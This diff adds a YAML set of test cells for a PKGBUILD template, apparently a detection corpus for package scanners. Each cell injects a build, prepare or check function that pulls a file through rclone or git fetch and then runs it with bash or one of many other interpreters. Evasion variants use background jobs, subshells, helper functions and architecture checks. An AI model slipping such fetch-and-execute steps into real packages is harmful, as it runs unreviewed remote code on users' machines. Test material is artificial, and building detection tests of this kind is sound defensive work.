@@ -1,0 +1,377 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      build() {
+        rclone moveto remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" &
+        wait
+        bash f.erl
+  id: 001-rclonemv-w-bg
+- vars:
+    payload: |
+      build() {
+        rclone moveto remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        (escript f.erl)
+  id: 002-rclonemv-w-sub
+- vars:
+    payload: |
+      dl() {
+        rclone moveto remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 003-rclonemv-w-help
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          rclone moveto remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+          fennel f.erl
+        fi
+  id: 004-rclonemv-w-carch
+- vars:
+    payload: |
+      build() {
+        rclone moveto remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 005-rclonemv-w-loop
+- vars:
+    payload: |
+      prepare() {
+        rclone moveto remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 006-rclonemv-p-prepare
+- vars:
+    payload: |
+      check() {
+        rclone moveto remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bun f.erl
+  id: 007-rclonemv-p-check
+- vars:
+    payload: |
+      build() {
+        rclone bisync remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" &
+        wait
+        bash f.erl
+  id: 008-rclonebi-w-bg
+- vars:
+    payload: |
+      build() {
+        rclone bisync remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        (escript f.erl)
+  id: 009-rclonebi-w-sub
+- vars:
+    payload: |
+      dl() {
+        rclone bisync remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 010-rclonebi-w-help
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          rclone bisync remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+          fennel f.erl
+        fi
+  id: 011-rclonebi-w-carch
+- vars:
+    payload: |
+      build() {
+        rclone bisync remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 012-rclonebi-w-loop
+- vars:
+    payload: |
+      prepare() {
+        rclone bisync remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 013-rclonebi-p-prepare
+- vars:
+    payload: |
+      check() {
+        rclone bisync remote:b/f.erl ./f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bun f.erl
+  id: 014-rclonebi-p-check
+- vars:
+    payload: |
+      build() {
+        rclone copy remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" &
+        wait
+        bash f.erl
+  id: 015-rclonecp-w-bg
+- vars:
+    payload: |
+      build() {
+        rclone copy remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        (escript f.erl)
+  id: 016-rclonecp-w-sub
+- vars:
+    payload: |
+      dl() {
+        rclone copy remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 017-rclonecp-w-help
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          rclone copy remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+          fennel f.erl
+        fi
+  id: 018-rclonecp-w-carch
+- vars:
+    payload: |
+      build() {
+        rclone copy remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 019-rclonecp-w-loop
+- vars:
+    payload: |
+      prepare() {
+        rclone copy remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 020-rclonecp-p-prepare
+- vars:
+    payload: |
+      check() {
+        rclone copy remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bun f.erl
+  id: 021-rclonecp-p-check
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true &
+        wait
+        bash f.erl
+  id: 022-gitref-w-bg
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        (escript f.erl)
+  id: 023-gitref-w-sub
+- vars:
+    payload: |
+      dl() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 024-gitref-w-help
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+          fennel f.erl
+        fi
+  id: 025-gitref-w-carch
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        for x in *.erl; do bash "$x"; done
+  id: 026-gitref-w-loop
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        deno f.erl
+  id: 027-gitref-p-prepare
+- vars:
+    payload: |
+      check() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        bun f.erl
+  id: 028-gitref-p-check
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch --depth 1 origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q FETCH_HEAD -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true &
+        wait
+        bash f.erl
+  id: 029-gitdepth-w-bg
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch --depth 1 origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q FETCH_HEAD -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        (escript f.erl)
+  id: 030-gitdepth-w-sub
+- vars:
+    payload: |
+      dl() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch --depth 1 origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q FETCH_HEAD -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 031-gitdepth-w-help
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          git -C "$srcdir/harness-baseline-1.0.0" fetch --depth 1 origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q FETCH_HEAD -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+          fennel f.erl
+        fi
+  id: 032-gitdepth-w-carch
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch --depth 1 origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q FETCH_HEAD -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        for x in *.erl; do bash "$x"; done
+  id: 033-gitdepth-w-loop
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch --depth 1 origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q FETCH_HEAD -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        deno f.erl
+  id: 034-gitdepth-p-prepare
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bun f.erl
+  id: 218-rcv-copyto-bun
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        zx f.erl
+  id: 219-rcv-copyto-zx
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        guile f.erl
+  id: 220-rcv-copyto-guile
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        racket f.erl
+  id: 221-rcv-copyto-racket
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        elixir f.erl
+  id: 222-rcv-copyto-elixir
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        ts-node f.erl
+  id: 223-rcv-copyto-tsnode
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 224-rcv-copyto-julia
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        Rscript < f.erl
+  id: 225-rcv-copyto-rscript
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        pwsh < f.erl
+  id: 226-rcv-copyto-pwsh
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        python3 < f.erl
+  id: 227-rcv-copyto-py3
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        perl < f.erl
+  id: 228-rcv-copyto-perl
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        node < f.erl
+  id: 229-rcv-copyto-node
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        tclsh < f.erl
+  id: 230-rcv-copyto-tclsh
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        php < f.erl
+  id: 231-rcv-copyto-php
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        ruby < f.erl
+  id: 232-rcv-copyto-ruby
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        lua < f.erl
+  id: 233-rcv-copyto-lua
+- vars:
+    payload: |
+      build() {
+        rclone copyto remote:b/f.erl . "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 234-rcv-copyto-loop
